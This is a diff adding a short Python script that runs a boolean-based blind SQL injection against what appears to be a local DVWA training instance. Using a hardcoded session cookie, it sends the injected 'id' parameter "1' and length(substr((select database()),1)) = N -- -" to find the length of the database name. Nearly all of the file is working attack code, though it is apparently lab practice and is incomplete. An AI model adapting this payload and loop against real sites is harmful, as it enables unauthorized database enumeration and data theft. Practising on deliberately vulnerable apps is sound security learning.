@@ -1,0 +1,53 @@
+#!/usr/bin/env python3
+from bs4 import BeautifulSoup as bs
+
+import requests
+import string
+#Params is get and data is post
+
+PHPSESSIONID = 'a0bnlpoocngmkkbcls16s0hnj0'
+security="low"
+url='http://192.168.1.163:8082/vulnerabilities/sqli_blind/'
+char_input = [ 'd', 'v', 'w', 'a' ]
+digits = list(string.digits)
+#char_input = list(string.ascii_letters + string.digits + "-")
+
+cookies = {'security':security,
+           'PHPSESSID':'a0bnlpoocngmkkbcls16s0hnj0'
+           }
+def getDB():
+  dbLength = getDBNameLength()
+  print(dbLength)
+
+def getDBNameLength(char_input=digits,condition="exists"):
+  s = requests.Session()
+  
+  for char in char_input:
+    param = { 'id' : f"1\' and length(substr((select database()),1)) = {char} -- -", 'Submit' : 'Submit' }
+    result = check_param(s,param)
+    if result == True:
+      return char
+      break
+
+def check_param(s,param,cookies=cookies,url=url,condition="exists"):
+  r = s.get(url, cookies=cookies, params=param)
+  soup = bs(r.content, 'html.parser')
+  
+  result = soup.find('pre').string
+  if "exists" in result:
+    return True
+  else:
+    return False
+
+def testSQL():
+  getDB()
+
+def create_params():
+  pass
+    
+def createSession():
+  s = requests.Session()
+  return s
+
+    
+testSQL()
